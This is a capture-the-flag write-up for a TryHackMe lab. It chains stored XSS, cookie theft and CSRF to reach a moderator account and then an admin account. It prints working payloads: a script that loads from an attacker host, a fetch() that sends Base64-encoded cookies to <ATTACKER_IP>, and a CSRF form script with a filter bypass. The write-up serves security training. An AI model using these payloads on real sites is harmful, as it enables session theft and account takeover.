# TryHackMe — Whats Your Name? Writeup

> **Room:** Whats Your Name?  
> **Skills:** XSS, Session Hijacking, CSRF  

---

## Table of Contents

- [Recon](#recon)
- [Phase 1 — Access to Moderator Account (XSS + Session Hijacking)](#phase-1--access-to-moderator-account-xss--session-hijacking)
- [Phase 2 — Access to Admin Account (XSS + CSRF)](#phase-2--access-to-admin-account-xss--csrf)

---

## Recon

An Nmap scan reveals three open ports:

| Port | Service |
|------|---------|
| 22   | SSH |
| 80   | Apache/2.4.41 (web server) |
| 8080 | Apache/2.4.41 (web server) |

- A Gobuster directory scan on port 80 suggests PHP is in use (PhpMyAdmin detected).
- Port 8080 returns a blank page.
- Port 80 shows the announcement of a soon-to-launch social network called **WorldWAP**, with a pre-registration form containing four input fields.

The registration form is reviewed and activated by a moderator — a potential entry point for client-side attacks.

---

## Phase 1 — Access to Moderator Account (XSS + Session Hijacking)

### Step 1: Test for XSS

To identify which input fields are vulnerable, a simple XSS payload is injected into each field, designed to make outbound requests to a listener so results can be distinguished per field:

```html
<script src="http://<ATTACKER_IP>/email"></script>
```

A PHP web server is started to catch incoming requests:

```bash
sudo php -S 0.0.0.0:80
```

**Result:** All fields except the password field triggered requests — confirming stored XSS. The password field is likely hashed or not rendered to the moderator.

### Step 2: Steal the Moderator's Session Cookie

A cookie-stealing payload is crafted and placed in the email field on registration:

```html
<script>
  fetch("http://<ATTACKER_IP>?cookie=" + btoa(document.cookie), { method: "GET" });
</script>
```

After a short wait, the PHP server receives a request containing the session cookie encoded in Base64.

### Step 3: Hijack the Session

1. Decode the Base64 cookie value.
2. Replace your browser's `PHPSESSID` cookie with the retrieved value.
3. Reload `worldwap.thm`.

**Result:** Redirected to the moderator's dashboard. A subdomain `login.worldwap.thm` is revealed as operational.

### Step 4: Access the Moderator Profile

- Add `login.worldwap.thm` to `/etc/hosts`.
- Navigate to `http://login.worldwap.thm/login.php` (found via page source).
- With the session cookie applied, you are redirected to `profile.php`.

🚩 **Flag 1** found in the page header.

---

## Phase 2 — Access to Admin Account (XSS + CSRF)

### Step 1: Identify Attack Surface

The social network includes:
- A **password reset** feature (no CSRF token protection).
- A **chat** with the administrator.
- XSS confirmed in the chat (`<script>alert(1)</script>` executes).

A Burp Suite intercept of a password change request shows it uses a `POST` request with `new_password` as the body parameter.

### Step 2: Craft a CSRF Payload

A script is written to silently submit a password-change form when the page loads:

```html
<script>
  window.onload = function() {
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = 'http://login.worldwap.thm/change_password.php';
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'new_password';
    input.value = 'hello';
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
  };
</script>
```

**Issue:** The application auto-formats HTTP URLs into `<a href>` anchor tags, breaking the payload.

### Step 3: Bypass URL Detection

The URL string is split to avoid the auto-formatter:

```html
<script>
  window.onload = function() {
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = 'ht'+'tP://' + 'login.worldwap.thm/change_password.php';
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'new_password';
    input.value = 'hello';
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
  };
</script>
```

### Step 4: Wait and Log In as Admin

After planting the payload in the chat, the admin visits and their password is silently changed to `hello`.

Log in at `login.worldwap.thm` with the admin credentials.

🚩 **Flag 2** found in the admin page header.

---

## Summary

| Step | Technique | Outcome |
|------|-----------|---------|
| Registration form testing | Stored XSS | Confirmed vulnerable fields |
| Cookie exfiltration | XSS + fetch() | Moderator session hijacked |
| Chat injection | XSS + CSRF | Admin password changed |
| Admin login | Credential access | Admin flag captured |

---

## Key Takeaways

- **Stored XSS** in user-supplied fields can be weaponised to steal session cookies from privileged users.
- **Missing CSRF tokens** on sensitive actions (like password resets) allow attackers to forge requests on behalf of authenticated users.
- URL sanitisation can often be bypassed with simple string concatenation tricks.